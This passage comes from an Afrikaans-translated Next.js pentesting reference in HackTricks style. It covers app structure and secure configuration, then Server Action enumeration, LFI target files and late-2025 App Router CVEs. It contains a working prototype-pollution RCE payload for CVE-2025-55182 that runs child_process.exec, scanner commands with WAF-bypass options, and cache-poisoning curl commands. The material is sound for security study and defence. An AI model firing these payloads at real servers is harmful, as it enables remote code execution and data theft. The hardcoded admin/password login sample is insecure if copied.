function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Doel:** Oorskryf die standaard Document en stel aanpassing van die `<html>`- en `<body>`-tags in staat.

**Gebruiksscenario's:**

- Aanpassing van die `<html>`- of `<body>`-tags.
- Byvoeging van meta-tags of pasgemaakte skripte.
- Integrasie van lettertipes van derde partye.

**Voorbeeld:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Custom Server (Opsioneel)

**Doel:** Alhoewel Next.js met 'n ingeboude server kom, kan jy 'n custom server skep vir gevorderde gebruiksgevalle soos custom routing of integrasie met bestaande backend services.

**Let wel:** Die gebruik van 'n custom server kan deployment options beperk, veral op platforms soos Vercel wat geoptimaliseer is vir Next.js se ingeboude server.

**Voorbeeld:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Bykomende Argitektoniese en Sekuriteitsaspekte

### Omgewingsveranderlikes en Konfigurasie

**Doel:** Bestuur sensitiewe inligting en konfigurasie-instellings buite die kodebasis.

**Beste praktyke:**

- **Gebruik `.env` lêers:** Stoor veranderlikes soos API-sleutels in `.env.local` (uitgesluit van weergawebeheer).
- **Verkry veranderlikes veilig:** Gebruik `process.env.VARIABLE_NAME` om by omgewingsveranderlikes te kom.
- **Moet nooit geheime aan die kliënt blootstel nie:** Verseker dat sensitiewe veranderlikes slegs op die bedienerkant gebruik word.

**Voorbeeld:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Nota:** Om veranderlikes slegs tot die server-side te beperk, laat hulle uit die `env` object weg of voeg die voorvoegsel `NEXT_PUBLIC_` by vir blootstelling aan die kliënt.

### Nuttige server-artefakte om via LFI/download endpoints te teiken

As jy 'n path traversal of download API in 'n Next.js app vind, teiken saamgestelde artefakte wat server-side secrets en auth logic leak:

- `.env` / `.env.local` vir sessie-sekrete en provider-inlogbewyse.
- `.next/routes-manifest.json` en `.next/build-manifest.json` vir 'n volledige lys roetes.
- `.next/server/pages/api/auth/[...nextauth].js` om die saamgestelde NextAuth-konfigurasie te herwin (dit bevat dikwels fallback-wagwoorde wanneer `process.env` waardes nie gestel is nie).
- `next.config.js` / `next.config.mjs` om herskrywings, herleiings en middleware-routering te hersien.

### Otentisering en magtiging

**Benadering:**

- **Sessiegebaseerde otentisering:** Gebruik cookies om gebruikersessies te bestuur.
- **Tokengebaseerde otentisering:** Implementeer JWTs vir staatslose otentisering.
- **Derdeparty-verskaffers:** Integreer met OAuth providers (bv. Google, GitHub) deur biblioteke soos `next-auth` te gebruik.

**Sekuriteitspraktyke:**

- **Beveiligde cookies:** Stel `HttpOnly`, `Secure`, en `SameSite` attributte.
- **Wagwoord-hashing:** Hasj wagwoorde altyd voor jy dit stoor.
- **Invoer-validasie:** Voorkom injection-aanvalle deur insette te valideer en te sanitiseer.

**Voorbeeld:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Prestasie-optimalisering

**Strategieë:**

- **Beeldoptimalisering:** Gebruik Next.js se `next/image` komponent vir outomatiese beeldoptimalisering.
- **Kode-splitsing:** Gebruik dinamiese imports om kode te splits en die aanvanklike laaityd te verminder.
- **Caching:** Implementeer caching-strategieë vir API-antwoorde en statiese assets.
- **Luie laai:** Laai komponente of assets slegs wanneer dit nodig is.

**Voorbeeld:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Moderne Next.js gebruik “Server Actions” wat op die bediener uitgevoer word maar vanaf die kliënt aangeroep word. In produksie is hierdie aanroepe ondoorgrondelik: alle POSTs beland by 'n gemeenskaplike endpoint en word onderskei deur 'n build-spesifieke hash wat in die `Next-Action` header gestuur word. Voorbeeld:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Wanneer `productionBrowserSourceMaps` geaktiveer is, bevat geminifiseerde JS-chunks oproepe na `createServerReference(...)` wat genoeg struktuur leak (plus geassosieerde source maps) om 'n mapping te herstel tussen die action hash en die oorspronklike funksienaam. Dit laat jou toe om hashes waargeneem in `Next-Action` te vertaal na konkrete teikens soos `deleteUserAccount()` of `exportFinancialData()`.

### Onttrekkingsbenadering (regex on minified JS + optional source maps)

Soek in afgelaaide JS-chunks na `createServerReference` en onttrek die hash en die funksie-/bron-simbool. Twee nuttige patrone:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Groep 1: server-aksie hash (40+ hex chars)
- Groep 2: simbool of pad wat na die oorspronklike funksie opgelos kan word via die source map wanneer teenwoordig

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### Praktiese werkvloei

- Passiewe ontdekking terwyl jy blaai: vang versoeke met `Next-Action` headers en JS chunk URLs.
- Haal die verwysde JS bundles en die gepaardgaande `*.map` lêers af (wanneer teenwoordig).
- Voer die regex hierbo uit om 'n hash↔name woordeboek te bou.
- Gebruik die woordeboek om toetsing te rig:
  - Naam-gedrewe triage (bv., `transferFunds`, `exportFinancialData`).
  - Hou dekking oor builds by funksienaam by (hashes roteer oor builds).

### Oefen van verborge aksies (sjabloon-gebaseerde versoek)

Neem 'n geldige POST wat in die proxy waargeneem is as 'n sjabloon en ruil die `Next-Action` waarde om 'n ander ontdekte aksie te teiken:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Speel dit weer in Repeater en toets outorisering, insetvalidasie en besigheidslogika van andersins onbereikbare aksies.

### Burp-outomatisering

- NextjsServerActionAnalyzer (Burp extension) outomatiseer hierbo in Burp:
- Deursoek proxy-geskiedenis na JS chunks, onttrek `createServerReference(...)` inskrywings, en parseer source maps waar beskikbaar.
- Onderhou 'n deursoekbare hash↔funksienaam-woordeboek en verwyder duplikate oor builds per funksienaam.
- Kan 'n geldige sjabloon POST opspoor en 'n gereed-om-te-stuur Repeater-oortjie oopmaak met die teiken-aksie se hash ingesit.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Aantekeninge en beperkings

- Vereis dat `productionBrowserSourceMaps` in produksie geaktiveer is om name uit bundles/source maps te herstel.
- Die bekendmaking van funksienaam is op sigself nie 'n kwetsbaarheid nie; gebruik dit om ontdekking te lei en elke aksie se outorisering te toets.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments wat Server Actions op `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** blootstel, bevat 'n kritieke server-side prototype pollution tydens **Flight** chunk deserialisasie. Deur `$` verwysings binne 'n Flight payload te vervaardig, kan 'n aanvaller van besoedelde prototipes na arbitrêre JavaScript-uitvoering skuif en dan na OS-opdraguitvoering binne die Node.js-proses.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Aanvalsverloop in Flight chunks

1. **Prototype pollution primitive:** Stel `"then": "$1:__proto__:then"` sodat die resolver 'n `then` funksie op `Object.prototype` skryf. Enige gewone object wat daarna verwerk word, word 'n thenable, wat die aanvaller toelaat om asynchrone beheervloei binne RSC internals te beïnvloed.
2. **Rebinding to the global `Function` constructor:** Wys `_response._formData.get` na `"$1:constructor:constructor"`. Tydens resolusie, `object.constructor` → `Object`, en `Object.constructor` → `Function`, sodat toekomstige oproepe na `_formData.get()` werklik `Function(...)` uitvoer.
3. **Code execution via `_prefix`:** Plaas JavaScript-bron in `_response._prefix`. Wanneer die besoedelde `_formData.get` aangeroep word, evalueer die raamwerk `Function(_prefix)(...)`, sodat die geïnjekteerde JS `require('child_process').exec()` of enige ander Node-primitive kan uitvoer.

#### Payload skeleton
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Kaartlegging van React Server Function-blootstelling

React Server Functions (RSF) is enige funksies wat die 'use server';-directive bevat. Elke form action, mutation, of fetch helper wat aan een van daardie funksies gebind is, word 'n RSC Flight endpoint wat graag deur 'n aanvaller verskafde payloads deserialiseer. Nuttige recon-stappe afgeleid van React2Shell assessments:

- **Statiese inventaris:** kyk vir die 'use server';-directive om te verstaan hoeveel RSFs deur die framework outomaties blootgestel word.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` enableer die App Router + `app/` directory standaard, wat stilweg elke route in 'n RSC-capable endpoint omskakel. App Router assets soos `/_next/static/chunks/app/` of responses wat Flight-chunks oor `text/x-component` stream, is sterk Internet-facing fingerprints.
- **Implicitly vulnerable RSC deployments:** React’s own advisory dui aan dat apps wat die RSC runtime insluit, exploitbaar kan wees **selfs sonder eksplisiete RSFs**, dus beskou enige build wat `react-server-dom-*` 19.0.0–19.2.0 gebruik as verdag.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. hergebruik dieselfde serializer en erf dieselfde remote attack surface totdat hulle gepatchte React-builds insluit.

#### Version coverage (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **vulnerable** in 19.0.0, 19.1.0–19.1.1 en 19.2.0; **patched** in 19.0.1, 19.1.2 en 19.2.1 onderskeidelik.
- **Next.js stable:** App Router releases 15.0.0–16.0.6 embed die kwetsbare RSC-stack. Patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 sluit gefikste deps in, so enige build onder daardie weergawes is van hoë waarde.
- **Next.js canary:** `14.3.0-canary.77+` lewer ook die buggy runtime en het tans geen gepatchte canary drops nie, wat daardie fingerprints sterk exploitasiemiddels maak.

#### Remote detection oracle

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) stuur 'n vervaardigde multipart Flight-request na kandidaatpade en monitor server-side gedrag:

- **Default mode** voer 'n deterministiese RCE-payload uit (wiskunde-operasie weerspieël via `X-Action-Redirect`) wat kode-uitvoering bewys.
- **`--safe-check` mode** maak doelbewus die Flight-boodskap malformed sodat gepatchte servers `200/400` teruggee, terwyl kwesbare teikens `HTTP/500` responses stuur wat die `E{"digest"` substring in die body bevat. Daardie `(500 + digest)` paar is tans die mees betroubare remote oracle wat deur verdedigers gepubliseer is.
- Ingeboude `--waf-bypass`, `--vercel-waf-bypass`, en `--windows` skakelaars pas payload-layout aan, voeg rommel voor, of ruil OS-opdragte sodat jy werklike Internet-bates kan probeer.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### Ander onlangse App Router-probleme (laat 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – verkeerd gevormde Flight-payloads kan die RSC-resolver in ’n oneindige lus dwing (pre-auth DoS) of die serialisering van saamgestelde Server Function-kode afdwing vir ander aksies. App Router builds ≥13.3 is geraak totdat dit gepatch word; 15.0.x–16.0.x benodig die spesifieke patchreëls uit die upstream advisory. Herbruik die normale Server Action-pad maar stroom ’n `text/x-component` body met misbruikende `$` verwysings. Agter ’n CDN word die vasgehangde konneksie oopgehou deur cache timeouts, wat die DoS goedkoop maak.
- **Triage wenk:** Teikens wat nie gepatch is nie gee `500` terug met `E{"digest"` na verkeerd gevormde Flight-payloads; gepatchte builds gee `400/200` terug. Toets enige endpoint wat reeds Flight-chunks stroom (kyk vir `Next-Action` headers of `text/x-component` responses) en herhaal met ’n gewysigde payload.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – ontbrekende `Vary` laat ’n `Accept: text/x-component` response in die cache beland en bedien word aan blaaiers wat HTML verwag. ’n Enkel priming-aanvraag kan die bladsy vervang met rou RSC-payloads. PoC-stroom:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
As die tweede response JSON Flight-data teruggee in plaas van HTML, is die roete besmetbaar. Maak die cache skoon na toetsing.

## Verwysings

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
